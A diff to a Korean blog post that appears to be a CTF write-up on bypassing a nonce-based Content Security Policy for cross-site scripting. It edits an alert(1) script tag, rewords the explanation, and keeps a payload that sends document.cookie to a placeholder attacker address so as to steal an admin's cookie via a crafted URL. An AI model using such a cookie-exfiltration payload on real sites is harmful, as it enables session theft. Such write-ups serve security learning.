@@ -65,7 +65,7 @@ CSP의 경우는 보통 요청 값이나 응답 값에 노출되는 경우가 �
 아까와 같이 스크립트를 삽입한다.
 삽입한 구문은 
 {% highlight js %}
-<script nonce="b04ppxGUAjltHc4UXpjG6ggg">[alert(1)]</script>
+<script nonce="b04ppxGUAjltHc4UXpjG6ggg">alert(1)</script>
 {% endhighlight %}
 으로 CSP 정책을 우회하게끔 작성하였다.
 
@@ -76,16 +76,13 @@ CSP의 경우는 보통 요청 값이나 응답 값에 노출되는 경우가 �
 
 ![]({{site.baseurl}}/images/GoogleRequest/FSA/8.png)
 
-악성 스크립트문을 작성하여 name값에 요청을 보낼 경우,
-
+name값에 악성 스크립트문을 작성하여 요청을 보낼 경우, 공격자의 서버로 전송이 되었다.
 
 {% highlight js %}
 <script nonce="bO4ppxGUAjltHc4UXpjG6ggg">fetch('[주소]?flag='+document.cookie)</script>
 {% endhighlight %}
 
-그대로 전송되어 공격자의 서버로 이동된다.
-
-이를 통해 ADMIN에게 URL을 보낼 경우 ADMIN의 cookie값을 알아낼 수 있다.
+ADMIN에게 name에 스크립트문 삽입한 URL을 보낼 경우 admin의 document.cookie값을 알아낼 수 있다.
 
 ![]({{site.baseurl}}/images/GoogleRequest/FSA/9.png)
 
@@ -103,4 +100,4 @@ ADMIN에게 보내는 방법을 몰라 헤맸다.
 
 그걸 헤매서 삽집하다 두 달이나 걸렸다.
 
-99% 풀어놓고 하이고 하이고오!!!!!!
+### 99% 풀어놓고 하이고 하이고오!!!!!!
